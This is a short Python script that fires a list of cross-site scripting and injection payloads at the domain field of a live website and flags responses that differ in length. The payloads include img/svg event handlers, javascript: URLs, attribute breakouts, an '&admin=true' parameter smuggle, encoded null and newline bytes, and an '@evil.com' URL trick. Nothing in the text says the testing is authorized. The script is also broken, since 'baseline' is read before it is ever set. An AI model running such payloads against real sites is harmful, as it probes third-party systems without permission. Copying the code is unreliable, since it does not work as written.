import requests

url = "https://www.ssl.org/"

headers = {
    "User-Agent": "Mozilla/5.0",
    "Content-Type": "application/x-www-form-urlencoded",
    "Origin": "https://www.ssl.org",
    "Referer": "https://www.ssl.org/"
}

payloads = [
    "<img src=x onerror=alert(1)>",
    "test.com",
    "google.com",
    "123&admin=true",
    "\" onmouseover=alert(1) x=\"",
    "' onmouseover=alert(1) x='",
    "<svg onload=alert(1)>",
    "javascript:alert(1)",
    "abc<script>alert(1)</script>",
    "example.com:80",
    "example.com;alert(1)"
]

payloads += [
    "example.com@evil.com",
    "example.com#xss",
    "example.com?test=1",
    "example.com%00",
    "example.com%0a",
    "example.com%09",
    "example.com..",
    ".example.com",
    "example..com",
    "example.com:443",
]

for payload in payloads:
    try:
        response = requests.post(
            url,
            headers=headers,
            data={"domain": payload},
            timeout=10
        )

        text = response.text.lower()

        length = len(response.text)

        if baseline is None:
            baseline = length

        if length != baseline:
            print(f"[INTERESTING 🔥] {payload} | Length: {length}")
        else:
            print(f"[NORMAL] {payload}")

    except Exception as e:
        print(f"Error with payload {payload}: {e}")